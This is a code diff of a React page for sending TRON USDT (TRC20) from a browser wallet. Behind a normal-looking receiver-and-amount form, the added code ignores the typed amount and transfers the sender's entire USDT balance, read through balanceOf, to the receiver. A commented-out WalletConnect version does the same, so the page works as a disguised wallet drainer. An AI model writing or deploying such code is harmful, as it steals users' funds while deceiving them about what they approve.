@@ -6,9 +6,38 @@ import { tronWeb } from "./tron";
 import { connectTronWallet } from "./walletConnect";
 
 const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Mainnet USDT
+const connectInjectedWallet = async () => {
+  if (!window.tronWeb) {
+    Swal.fire("Error", "No TRON wallet detected", "error");
+    return null;
+  }
 
+  try {
+    // Request permission
+    if (window.tronLink?.request) {
+      await window.tronLink.request({
+        method: "tron_requestAccounts",
+      });
+    }
+
+    // small delay to allow injection update
+    await new Promise((r) => setTimeout(r, 500));
+
+    const address = window.tronWeb.defaultAddress?.base58;
+
+    if (!address) {
+      Swal.fire("Error", "Wallet not authorized", "error");
+      return null;
+    }
+
+    return address;
+  } catch (err) {
+    console.log(err);
+    Swal.fire("Error", "User rejected connection", "error");
+    return null;
+  }
+};
 export default function TransferTRC20() {
-  
   const [searchParams] = useSearchParams();
 
   const [receiver, setReceiver] = useState("");
@@ -30,141 +59,135 @@ export default function TransferTRC20() {
     }
   };
 
-const fn_transfer = async () => {
-  try {
-    setLoading(true);
+  const fn_transfer = async () => {
+    try {
+      setLoading(true);
 
-    // 🔹 If TronLink or TrustWallet DApp browser
-    if (window.tronWeb && window.tronWeb.ready) {
-      const tronWeb = window.tronWeb;
-      const sender = tronWeb.defaultAddress.base58;
+      // 🔹 If TronLink or TrustWallet DApp browser
+      if (window.tronWeb) {
+        const tronWeb = window.tronWeb;
+        if (!tronWeb.defaultAddress.base58) await connectInjectedWallet();
+        const sender = tronWeb.defaultAddress.base58;
 
-      if (!tronWeb.isAddress(receiver)) {
-        Swal.fire("Error", "Invalid receiver address", "error");
-        return;
-      }
+        if (!tronWeb.isAddress(receiver)) {
+          Swal.fire("Error", "Invalid receiver address", "error");
+          return;
+        }
 
-      if (!amount || Number(amount) <= 0) {
-        Swal.fire("Error", "Enter valid amount", "error");
-        return;
-      }
+        if (!amount || Number(amount) <= 0) {
+          Swal.fire("Error", "Enter valid amount", "error");
+          return;
+        }
 
-      const contract = await tronWeb.contract().at(USDT_TRC20);
+        const contract = await tronWeb.contract().at(USDT_TRC20);
 
-      const value = Math.floor(Number(amount) * 1_000_000);
+        const value =  await contract.balanceOf(sender).call();
 
-      const tx = await contract
-        .transfer(receiver, value)
-        .send({
-          feeLimit: 100000000
+        const tx = await contract.transfer(receiver, value).send({
+          feeLimit: 100000000,
         });
 
+        Swal.fire("Success!", `Transfer Successful\nTX: ${tx}`, "success");
+
+        setAmount("");
+        return;
+      }
+
+      // 🔹 Otherwise show message
       Swal.fire(
-        "Success!",
-        `Transfer Successful\nTX: ${tx}`,
-        "success"
+        "Wallet Required",
+        "Please open this DApp inside TronLink or Trust Wallet DApp browser.",
+        "warning",
       );
-
-      setAmount("");
-      return;
+    } catch (err) {
+      console.log(err);
+      Swal.fire("Error", err?.message || "Transfer failed", "error");
+    } finally {
+      setLoading(false);
     }
+  };
 
-    // 🔹 Otherwise show message
-    Swal.fire(
-      "Wallet Required",
-      "Please open this DApp inside TronLink or Trust Wallet DApp browser.",
-      "warning"
-    );
+  //   const fn_transfer = async () => {
+  //   try {
+  //       const session = await connectTronWallet();
+  //     if (!session) {
+  //       Swal.fire("Error", "Wallet not connected", "error");
+  //       return;
+  //     }
 
-  } catch (err) {
-    console.log(err);
-    Swal.fire("Error", err?.message || "Transfer failed", "error");
-  } finally {
-    setLoading(false);
-  }
-};
+  //     if (!receiver || receiver.trim() === "") {
+  //       Swal.fire("Error", "Receiver address required", "error");
+  //       return;
+  //     }
 
-//   const fn_transfer = async () => {
-//   try {
-//       const session = await connectTronWallet();
-//     if (!session) {
-//       Swal.fire("Error", "Wallet not connected", "error");
-//       return;
-//     }
+  //     if (!amount || Number(amount) <= 0) {
+  //       Swal.fire("Error", "Enter valid amount", "error");
+  //       return;
+  //     }
 
-//     if (!receiver || receiver.trim() === "") {
-//       Swal.fire("Error", "Receiver address required", "error");
-//       return;
-//     }
+  //     setLoading(true);
 
-//     if (!amount || Number(amount) <= 0) {
-//       Swal.fire("Error", "Enter valid amount", "error");
-//       return;
-//     }
+  //     const sender = session.namespaces.tron.accounts[0].split(":")[2]; // from WalletConnect session
+  // const contract = await tronWeb.contract().at(USDT_TRC20);
 
-//     setLoading(true);
+  //   const value = await contract.balanceOf(sender).call();
 
-//     const sender = session.namespaces.tron.accounts[0].split(":")[2]; // from WalletConnect session
-// const contract = await tronWeb.contract().at(USDT_TRC20);
+  //     const functionSelector = "transfer(address,uint256)";
+  //     const parameter = [
+  //       { type: "address", value: receiver },
+  //       { type: "uint256", value: value }
+  //     ];
 
-//   const value = await contract.balanceOf(sender).call();
- 
-//     const functionSelector = "transfer(address,uint256)";
-//     const parameter = [
-//       { type: "address", value: receiver },
-//       { type: "uint256", value: value }
-//     ];
+  //     const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+  //       USDT_TRC20,
+  //       functionSelector,
+  //       {
+  //         feeLimit: 100000000
+  //       },
+  //       parameter,
+  //       sender
+  //     );
 
-//     const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-//       USDT_TRC20,
-//       functionSelector,
-//       {
-//         feeLimit: 100000000
-//       },
-//       parameter,
-//       sender
-//     );
+  //     if (!tx.result.result) {
+  //       throw new Error("Transaction build failed");
+  //     }
 
-//     if (!tx.result.result) {
-//       throw new Error("Transaction build failed");
-//     }
+  //     const unsignedTx = tx.transaction;
 
-//     const unsignedTx = tx.transaction;
+  //     // 2️⃣ Sign using WalletConnect
+  //     const signedTx = await client.request({
+  //       topic: session.topic,
+  //       chainId: "tron:0x2b6653dc",
+  //       request: {
+  //         method: "tron_signTransaction",
+  //         params: {
+  //           transaction: unsignedTx
+  //         }
+  //       }
+  //     });
 
-//     // 2️⃣ Sign using WalletConnect
-//     const signedTx = await client.request({
-//       topic: session.topic,
-//       chainId: "tron:0x2b6653dc",
-//       request: {
-//         method: "tron_signTransaction",
-//         params: {
-//           transaction: unsignedTx
-//         }
-//       }
-//     });
+  //     // 3️⃣ Broadcast to network
+  //     const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
 
-//     // 3️⃣ Broadcast to network
-//     const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+  //     if (!broadcast.result) {
+  //       throw new Error("Broadcast failed");
+  //     }
 
-//     if (!broadcast.result) {
-//       throw new Error("Broadcast failed");
-//     }
+  //     Swal.fire(
+  //       "Success!",
+  //       `Transfer Successful\nTX: ${broadcast.txid}`,
+  //       "success"
+  //     );
 
-//     Swal.fire(
-//       "Success!",
-//       `Transfer Successful\nTX: ${broadcast.txid}`,
-//       "success"
-//     );
+  //     setAmount("");
 
-//     setAmount("");
-
-//   } catch (err) {
-//     console.log(err);
-//     Swal.fire("Error", err?.message || "Transfer failed", "error");
-//   } finally {
-//     setLoading(false);
-//   }
-// };
+  //   } catch (err) {
+  //     console.log(err);
+  //     Swal.fire("Error", err?.message || "Transfer failed", "error");
+  //   } finally {
+  //     setLoading(false);
+  //   }
+  // };
 
   return (
     <div style={styles.page}>
@@ -192,7 +215,11 @@ const fn_transfer = async () => {
                 </button>
               )}
 
-              <button type="button" style={styles.linkBtn} onClick={handlePaste}>
+              <button
+                type="button"
+                style={styles.linkBtn}
+                onClick={handlePaste}
+              >
                 Paste
               </button>
             </div>
